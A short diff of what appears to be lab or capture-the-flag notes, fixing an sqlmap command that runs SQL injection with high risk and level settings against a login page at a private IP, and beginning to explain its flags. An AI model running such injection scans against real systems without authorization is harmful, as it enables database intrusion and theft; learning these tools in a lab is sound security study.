@@ -14,7 +14,7 @@ URL changes to http://192.168.32.49/checklogin.php
 SQLmap
 ///////////////////
 COMMAND USED
-sqlmap -u "http://192.168.32.49/checklogin.php" --data "myusername=%27&mypassword=%27&Submit=Login" --risk=3 --level=5 -dbs
+sqlmap -u "http://192.168.32.49/checklogin.php" --data "myusername=%27&mypassword=%27&Submit=Login" --risk=3 --level=5 --dbs
 
 -u = Specify target URL
 --risk=3 = detection more likely if higher as performs risky attacks
